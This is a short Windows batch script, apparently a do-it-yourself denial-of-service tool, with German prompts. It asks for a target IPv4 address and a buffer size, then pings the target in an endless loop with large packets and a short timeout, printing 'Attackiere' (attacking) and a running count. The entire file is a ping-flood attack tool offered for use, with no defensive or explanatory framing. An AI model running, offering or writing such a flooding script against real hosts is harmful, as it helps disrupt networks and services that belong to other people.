@echo off
title DOS
color fc
set /p IP=IPv4:
set /p Puffer=SendePuffer:

:A
set /a Send=%Send%+1
ping %IP% -l %Puffer% -w 15 -n 1 >NUL
echo Attackiere :%IP%:%Puffer%:%Send%
goto A